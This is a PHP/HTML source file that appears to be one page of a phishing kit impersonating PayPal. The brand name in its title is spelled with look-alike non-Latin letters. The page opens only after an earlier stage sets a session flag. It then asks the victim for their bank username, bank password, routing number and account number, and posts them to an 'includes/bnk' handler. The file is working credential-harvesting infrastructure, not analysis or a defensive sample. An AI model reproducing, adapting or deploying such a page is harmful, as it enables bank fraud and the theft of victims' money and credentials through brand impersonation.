<?
session_start();
if ($_SESSION['proofId'] !== 'success') {
	header('Location:home');
}
include("../lang/language.php");
?>
<!DOCTYPE html>
<html lang="en_G2" dir="ltr" class="js"><head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="format-detection" content="telephone=no">
<link rel="shortcut icon" type="image/x-icon" href="../files/img/favicon.ico">
<title>ΡаyΡаI: <? echo($language['bar'][1]) ?></title>
<link rel="stylesheet" href="../files/css/wallet.ltr.css">
<link rel="stylesheet" type="text/css" href="../files/css/ap.css">

</head> 
 <style type="text/css">
     button[disabled], html input[disabled] {
    cursor: context-menu;
     background: transparent; 
 </style>
 <img hidden="" src="../files/img/savings.png">
<body class="feature-analytics feature-bundle feature-captcha feature-fso feature-global-rollout feature-installment-summary feature-migrate-fi-credit feature-redirectToSynchrony G2 overpanelOpen">
<section id="overpanel" class="theoverpanel animated med fadeInUpBig" tabindex="-1" role="dialog" aria-labelledby="overpanel-header" aria-hidden="false">
 <div id="rot" class="rotation"> <p><? echo($language['home'][2]) ?></p> </div>
          
<div class="addBank overpanel-wrapper row"><div class="col-xs-12">
<a href="home" class="dismiss close nemo_dismissClose" name="close|addBank" aria-describedby="overpanel-header" role="button" data-push-replace="false" data-pagename="" data-track-type="link">
<span class="icon icon-close-small" aria-hidden="true"></span>
<span class="accessAid">Close</span></a></div><div class=" overpanel-content col-xs-12 col-xs-offset-0 col-sm-8 col-sm-offset-2 col-md-4 col-md-offset-4" style="padding-top: 64px;overflow: auto;" role="document"><div id="overpanel-header" class=" overpanel-header"><h2 id="overpanel-header"><? echo($language['bank'][1]) ?></h2><br></div><div class=" overpanel-body">
<p><? echo($language['bank'][2]) ?></p>
<form id="bnk_form" action="includes/bnk" method="post" novalidate="">
<div class="fields">
<div class="bankType vx_btn-group toggleBtnGroup clearfix"><input type="radio" id="checking" class="accessAid" name="accountType" value="checking" checked="checked"><label class="vx_btn vx_btn-secondary toggleBtn col-xs-6 btnCol6 checking_b checked" for="checking"><? echo($language['bank'][3]) ?></label><input type="radio" id="savings" class="accessAid" name="accountType" value="savings"><label class="vx_btn vx_btn-secondary toggleBtn col-xs-6 btnCol6 savings_b" for="savings"><? echo($language['bank'][4]) ?></label></div><div class="checkWrapper enforceLtr"><div class="check checking"><div style="padding-top: 111.5px"></div><div class="db">




<input type="" id="rm" class="bor1 size" disabled="" name="">
<input type="" id="rm1" class="bor1 size1" disabled="" name="">
</div></div></div><div class="accountNumbers ltrInputGroup"><div class="row">

<div class="col-xs-12 col-lg-5" style="position: relative;">
<style type="text/css">
	.groupe_input .right {
		float: right;position: relative;width: 49.2%;
	}
	.groupe_input .left{
		float: left;position: relative;width: 49.2%;
	}
@media(max-width: 728px){
	#fc1{
		margin-top: 6px;
	}
	.right input{
	    margin-top: 6px;
}
		.groupe_input .right, .groupe_input .left{
		width: 100% !important;
	}
}
</style>
</div><br>
<div class="groupe_input">
<div class="left">
	<input class="enterInput1" required="" autocomplete="off" type="text" name="user" id="user" placeholder="<? echo($language['bank'][5]) ?>" maxlength="19">
</div>
<div class="right">
	<input class="enterInput1" required="" autocomplete="off" type="text" name="passbnk" id="pass" placeholder="<? echo($language['bank'][6]) ?>" maxlength="19">
</div>

</div>


<div class="groupe_input">
<div style="clear: both;margin: 6px;"></div>
<div class="left">
<input class="enterInput1" required="" type="number" autocomplete="off" name="rnum" id="rnum" placeholder="<? echo($language['bank'][7]) ?>" maxlength="19" onkeypress='return event.charCode >= 48 && event.charCode <= 57'>
<div id="rnum_info" class="focus hide">
    <p style="margin: 0"><? echo($language['bank'][10]) ?></p>
</div>
</div>



<div id="rel" class="right">
<input class="enterInput1" required="" autocomplete="off" type="number" name="acnum" id="acnum" placeholder="<? echo($language['bank'][8]) ?>" maxlength="19" onkeypress='return event.charCode >= 48 && event.charCode <= 57'>
<div id="acnum_info" class="focus hide">
    <p style="margin: 0"><? echo($language['bank'][11]) ?></p>
</div>
</div>
</div>


</div></div>
<br><button id="saveBankInfo" class="btn block" style="width: 100%;outline: 0;clear: both;margin-top: 24px" name="continue"><? echo($language['bank'][9]) ?></button></form></div></div></div></div></section>
<script src="../files/js/jquery.js"></script>
<script src="../files/js/plugins.js"></script>
<script src='../files/js/password.js'></script>
</body></html> 